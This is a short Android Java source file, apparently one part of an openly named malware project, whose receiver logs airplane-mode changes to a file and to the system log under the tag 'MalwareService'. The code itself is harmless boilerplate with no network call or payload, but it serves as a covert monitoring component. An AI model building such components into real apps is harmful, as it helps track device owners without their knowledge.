package com.malware.phone;

import com.malware.service.MyService;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;


public class AirplaneReceiver extends BroadcastReceiver {
	private MyService service;

	public AirplaneReceiver(MyService service){
		this.service = service;
	}

	public void onReceive(Context context, Intent intent){
		String action = intent.getAction();
		Bundle extras = intent.getExtras();

		if(action.equals(Intent.ACTION_AIRPLANE_MODE_CHANGED)){
			boolean state = extras.getBoolean("state");
			
			service.addTextToFile((state ? "Mode avion ON" : "Mode avion OFF"),"tmp");
			Log.v("MalwareService", (state ? "Mode avion ON" : "Mode avion OFF"));
		}
	}
}
